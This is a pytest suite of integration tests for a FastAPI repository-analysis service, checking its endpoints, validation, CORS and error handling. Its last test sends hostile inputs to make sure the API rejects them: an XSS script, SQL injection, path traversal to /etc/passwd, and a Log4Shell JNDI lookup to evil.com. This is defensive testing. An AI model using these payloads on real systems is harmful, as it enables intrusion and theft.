"""Comprehensive API integration tests for FastAPI endpoints."""

import pytest
import json
import tempfile
import os
import shutil
from fastapi.testclient import TestClient
from unittest.mock import Mock, patch, MagicMock

# Import the FastAPI app
from api import app
from src.state import AnalysisState, AnalysisRequest


class TestAPIEndpoints:
    """Test FastAPI endpoint functionality."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.client = TestClient(app)
        self.temp_dir = tempfile.mkdtemp()
        
        # Create test repository
        with open(os.path.join(self.temp_dir, "main.py"), "w") as f:
            f.write('''
def hello_world():
    """A simple hello world function."""
    print("Hello, World!")
    return "Hello, World!"

if __name__ == "__main__":
    hello_world()
''')
    
    def teardown_method(self):
        """Clean up test fixtures."""
        shutil.rmtree(self.temp_dir)
    
    def test_health_check_endpoint(self):
        """Test health check endpoint."""
        response = self.client.get("/health")
        
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "healthy"
        assert "timestamp" in data
        assert "version" in data
    
    def test_analyze_repository_endpoint_success(self):
        """Test successful repository analysis."""
        with patch('src.workflow.create_analysis_workflow') as mock_workflow:
            # Mock workflow execution
            mock_app = Mock()
            mock_final_state = AnalysisState(
                request=AnalysisRequest(
                    repository_url=self.temp_dir,
                    analysis_type="comprehensive"
                )
            )
            mock_final_state.status = "completed"
            mock_final_state.final_report = {
                "repository_url": self.temp_dir,
                "analysis_type": "comprehensive",
                "summary": {
                    "total_tools": 3,
                    "successful_tools": 3,
                    "total_issues": 2
                },
                "detailed_results": [],
                "recommendations": ["Add more tests"]
            }
            mock_app.invoke.return_value = mock_final_state
            mock_workflow.return_value = mock_app
            
            request_data = {
                "repository_url": self.temp_dir,
                "analysis_type": "comprehensive"
            }
            
            response = self.client.post("/analyze", json=request_data)
            
            assert response.status_code == 200
            data = response.json()
            assert data["status"] == "completed"
            assert "final_report" in data
            assert data["final_report"]["analysis_type"] == "comprehensive"
    
    def test_analyze_repository_endpoint_validation_errors(self):
        """Test repository analysis with validation errors."""
        # Test missing repository_url
        request_data = {
            "analysis_type": "comprehensive"
        }
        
        response = self.client.post("/analyze", json=request_data)
        assert response.status_code == 422  # Validation error
        
        # Test invalid analysis_type
        request_data = {
            "repository_url": self.temp_dir,
            "analysis_type": "invalid_type"
        }
        
        response = self.client.post("/analyze", json=request_data)
        assert response.status_code == 422  # Validation error
    
    def test_analyze_repository_endpoint_with_options(self):
        """Test repository analysis with various options."""
        with patch('src.workflow.create_analysis_workflow') as mock_workflow:
            mock_app = Mock()
            mock_final_state = Mock()
            mock_final_state.status = "completed"
            mock_final_state.final_report = {"status": "success"}
            mock_app.invoke.return_value = mock_final_state
            mock_workflow.return_value = mock_app
            
            request_data = {
                "repository_url": "https://github.com/test/repo",
                "analysis_type": "security",
                "target_files": ["main.py", "utils.py"],
                "specific_tools": ["Bandit Security Tool"],
                "include_ai_analysis": True
            }
            
            response = self.client.post("/analyze", json=request_data)
            
            assert response.status_code == 200
            data = response.json()
            assert data["status"] == "completed"
    
    def test_get_available_tools_endpoint(self):
        """Test get available tools endpoint."""
        response = self.client.get("/tools")
        
        assert response.status_code == 200
        data = response.json()
        assert "tools" in data
        assert len(data["tools"]) > 0
        
        # Check tool structure
        for tool in data["tools"]:
            assert "name" in tool
            assert "description" in tool
            assert "category" in tool
    
    def test_get_tools_by_category_endpoint(self):
        """Test get tools by category endpoint."""
        categories = ["filesystem", "analysis", "ai_analysis", "github", "communication"]
        
        for category in categories:
            response = self.client.get(f"/tools/{category}")
            
            assert response.status_code == 200
            data = response.json()
            assert "category" in data
            assert "tools" in data
            assert data["category"] == category
    
    def test_get_tools_invalid_category(self):
        """Test get tools with invalid category."""
        response = self.client.get("/tools/invalid_category")
        
        assert response.status_code == 404
        data = response.json()
        assert "detail" in data
    
    def test_execute_tool_endpoint(self):
        """Test execute individual tool endpoint."""
        with patch('tools.filesystem_tools.FileReadTool._run') as mock_run:
            mock_run.return_value = {
                "file_path": "test.py",
                "content": "def test(): pass",
                "size": 17,
                "lines": 1
            }
            
            request_data = {
                "tool_name": "File Read Tool",
                "parameters": "test.py"
            }
            
            response = self.client.post("/execute-tool", json=request_data)
            
            assert response.status_code == 200
            data = response.json()
            assert data["tool_name"] == "File Read Tool"
            assert data["status"] == "success"
            assert "result" in data
    
    def test_execute_tool_not_found(self):
        """Test execute tool with non-existent tool."""
        request_data = {
            "tool_name": "Non Existent Tool",
            "parameters": "test"
        }
        
        response = self.client.post("/execute-tool", json=request_data)
        
        assert response.status_code == 404
        data = response.json()
        assert "detail" in data
    
    def test_execute_tool_with_error(self):
        """Test execute tool that returns an error."""
        with patch('tools.filesystem_tools.FileReadTool._run') as mock_run:
            mock_run.return_value = {
                "error": "File not found"
            }
            
            request_data = {
                "tool_name": "File Read Tool",
                "parameters": "nonexistent.py"
            }
            
            response = self.client.post("/execute-tool", json=request_data)
            
            assert response.status_code == 200
            data = response.json()
            assert data["status"] == "error"
            assert "error" in data["result"]
    
    def test_get_analysis_status_endpoint(self):
        """Test get analysis status endpoint."""
        # This would typically require a real analysis ID
        # For now, test the endpoint structure
        response = self.client.get("/analysis/test-id/status")
        
        # Should return 404 for non-existent analysis
        assert response.status_code == 404
    
    def test_cors_headers(self):
        """Test CORS headers are properly set."""
        response = self.client.options("/health")
        
        # Check that CORS headers are present
        assert "access-control-allow-origin" in response.headers
    
    def test_request_validation(self):
        """Test request validation for various endpoints."""
        # Test analyze endpoint with invalid JSON
        response = self.client.post(
            "/analyze",
            data="invalid json",
            headers={"Content-Type": "application/json"}
        )
        assert response.status_code == 422
        
        # Test execute-tool endpoint with missing parameters
        response = self.client.post("/execute-tool", json={})
        assert response.status_code == 422
    
    def test_error_handling_in_endpoints(self):
        """Test error handling in API endpoints."""
        with patch('src.workflow.create_analysis_workflow') as mock_workflow:
            # Mock workflow to raise an exception
            mock_workflow.side_effect = Exception("Workflow error")
            
            request_data = {
                "repository_url": self.temp_dir,
                "analysis_type": "comprehensive"
            }
            
            response = self.client.post("/analyze", json=request_data)
            
            # Should handle the error gracefully
            assert response.status_code == 500
            data = response.json()
            assert "detail" in data
    
    def test_large_request_handling(self):
        """Test handling of large requests."""
        # Create a request with very large parameters
        large_file_list = [f"file_{i}.py" for i in range(1000)]
        
        request_data = {
            "repository_url": self.temp_dir,
            "analysis_type": "comprehensive",
            "target_files": large_file_list
        }
        
        with patch('src.workflow.create_analysis_workflow') as mock_workflow:
            mock_app = Mock()
            mock_final_state = Mock()
            mock_final_state.status = "completed"
            mock_final_state.final_report = {"status": "success"}
            mock_app.invoke.return_value = mock_final_state
            mock_workflow.return_value = mock_app
            
            response = self.client.post("/analyze", json=request_data)
            
            # Should handle large requests
            assert response.status_code == 200
    
    def test_concurrent_requests(self):
        """Test handling of concurrent requests."""
        import threading
        import time
        
        results = []
        
        def make_request():
            response = self.client.get("/health")
            results.append(response.status_code)
        
        # Make multiple concurrent requests
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # All requests should succeed
        assert all(status == 200 for status in results)
        assert len(results) == 10
    
    def test_response_format_consistency(self):
        """Test that API responses have consistent format."""
        # Test health endpoint
        response = self.client.get("/health")
        data = response.json()
        assert isinstance(data, dict)
        assert "status" in data
        
        # Test tools endpoint
        response = self.client.get("/tools")
        data = response.json()
        assert isinstance(data, dict)
        assert "tools" in data
        assert isinstance(data["tools"], list)
        
        # Test tools by category endpoint
        response = self.client.get("/tools/filesystem")
        data = response.json()
        assert isinstance(data, dict)
        assert "category" in data
        assert "tools" in data
    
    def test_api_documentation_endpoints(self):
        """Test API documentation endpoints."""
        # Test OpenAPI schema
        response = self.client.get("/openapi.json")
        assert response.status_code == 200
        
        # Test docs endpoint
        response = self.client.get("/docs")
        assert response.status_code == 200
        
        # Test redoc endpoint
        response = self.client.get("/redoc")
        assert response.status_code == 200


class TestAPIAuthentication:
    """Test API authentication and security."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.client = TestClient(app)
    
    def test_api_without_authentication(self):
        """Test API access without authentication."""
        # Currently the API doesn't require authentication
        # This test ensures endpoints are accessible
        response = self.client.get("/health")
        assert response.status_code == 200
    
    def test_rate_limiting(self):
        """Test rate limiting if implemented."""
        # Make many requests quickly
        responses = []
        for _ in range(100):
            response = self.client.get("/health")
            responses.append(response.status_code)
        
        # Should either all succeed or implement rate limiting
        assert all(status in [200, 429] for status in responses)
    
    def test_input_sanitization(self):
        """Test input sanitization for security."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        ]
        
        for malicious_input in malicious_inputs:
            request_data = {
                "repository_url": malicious_input,
                "analysis_type": "comprehensive"
            }
            
            response = self.client.post("/analyze", json=request_data)
            
            # Should either reject or sanitize malicious input
            assert response.status_code in [400, 422, 500]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
